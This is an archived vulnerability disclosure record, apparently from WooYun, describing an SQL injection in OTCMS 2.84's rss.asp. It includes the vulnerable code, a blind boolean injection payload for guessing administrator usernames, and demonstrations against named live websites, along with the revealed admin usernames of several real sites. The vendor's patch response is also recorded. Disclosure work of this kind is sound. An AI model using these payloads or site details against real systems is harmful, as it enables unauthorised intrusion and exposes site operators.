{"id": 53034, "wybug_id": "wooyun-2014-069130", "wybug_title": "网钛文章管理系统(OTCMS)2.84 SQL注射漏洞", "wybug_corp": "otcms.com", "wybug_author": "语邑尘", "wybug_date": "2014-07-21 18:52", "wybug_open_date": "2014-09-04 18:54", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-04：\t细节向公众公开  简要描述： 网钛文章管理系统(OTCMS)2.84 存在SQL注射漏洞。 详细说明：  网钛文章管理系统(OTCMS)2.84 的 rss.asp 存在注入漏洞。可获取管理员及密码。因密码经过两次CMD5加密，危害较小。问题代码：\ntypeStr\t= Trim(request.querystring(\"typeStr\"))\tmaxNum\t= Trim(request.querystring(\"maxNum\"))\t\ttypeWhereStr = \"\"\t\ttypeTitle = \"\"\t\tIf typeStr=\"announ\" Then\t\t\ttypeTitle = SYS_homeAnnounName & SYS_titleSign\t\t\ttypeWhereStr = \" and IF_type1ID=-1\"\t\tElseIf InStr(typeStr,\",\")>0 Then\t\t\ttypeArr = Split(typeStr,\",\")\t\t\ttypeUbound=UBound(typeArr)\t\t\tIf typeUbound>=2 Then\t\t\t\ttypeRank = 1\t\t\t\ttypeRankID = typeArr(1)\t\t\t\tIf typeUbound>=3 Then\t\t\t\t\ttypeRank = 2\t\t\t\t\ttypeRankID = typeArr(2)\t\t\t\t\tIf typeUbound>=4 Then\t\t\t\t\t\ttypeRank = 3\t\t\t\t\t\ttypeRankID = typeArr(3)\t\t\t\t\tEnd If\t\t\t\tEnd If\t\t\t\tSet typeexe=conobj.execute(\"select IT_theme from OT_infoType where IT_ID=\"& typeRankID)\t\t\t\t\tIf Not typeexe.EOF Then\t\t\t\t\t\ttypeTitle = typeexe(\"IT_theme\") & SYS_titleSign\t\t\t\t\t\ttypeWhereStr = \" and IF_type\"& typeRank &\"ID=\"& typeRankID\t\t\t\t\tEnd If\t\t\t\ttypeexe.close\t\t\t\tSet typeexe=Nothing\n此文件没有包含通过防注入系统，变量typeStr 获取后经过逗号分割后进入数据库查询，所以只要构造一个特殊的语句让逗号分割后形成注入语句即可。特殊语句示例：\nrss.asp?typeStr=1234,11 and (select count(*) from OT_member where MB_ID=1 and MB_username like 'w____')>0,888\n语句经过分割后\n11 and (select count(*) from OT_member where MB_ID=1 and MB_username like 'w____')>0\n会被代入数据库查询。注入漏洞形成。 因此变量是用逗号分割的，所以注入语句不能有逗号， 要用like   如猜到是5位  则猜a____,b____ 直到返回正确的结果。 另外11这个数值并不是固定的，我的方法是从11试到50，哪个返回的字节数最少就用哪个猜，容易判断。   漏洞证明：  关键字 dynWeb.asp?dataID=网站1:http://www.hx-x.com/  手工注入累死人，我只给出正确的结果，乌云可以自己去验证。管理员用户名为：wwwhxx  密码就不猜了  ，猜了也没用。注入语句：\nhttp://www.hx-x.com/rss.asp?typeStr=1234,11 and (select count(*) from OT_member where MB_ID=1 and MB_username like 'wwwhxx')>0,888\n截图为\n\n如果将 wwwhxx 换成别的字符 如\nhttp://www.hx-x.com/rss.asp?typeStr=1234,11 and (select count(*) from OT_member where MB_ID=1 and MB_username like 'abcdefg')>0,888\n\n\n这两次返回的结果是不一样的。 这样的网站有很多如http://www.tao3.org/  管理员为：adminhttp://www.clguoji.com/ 管理员为：zx458260889http://www.hflwzx.com/ 管理员为：qkdhwhttp://www.e-home-68.com 管理员：wuhua   修复方案：  对分割后的字段进行验证即可。   版权声明：转载请注明来源 语邑尘@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-07-21 23:34 厂商回复： 很感谢 路人甲 反馈网钛OTCMS系统漏洞，经检查确实存在该漏洞。 最新状态： 2014-08-16：该漏洞已于网钛CMS V5.00版本修复了。 2014-09-11：网钛CMS免费版已于 V2.85版本修复了。  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}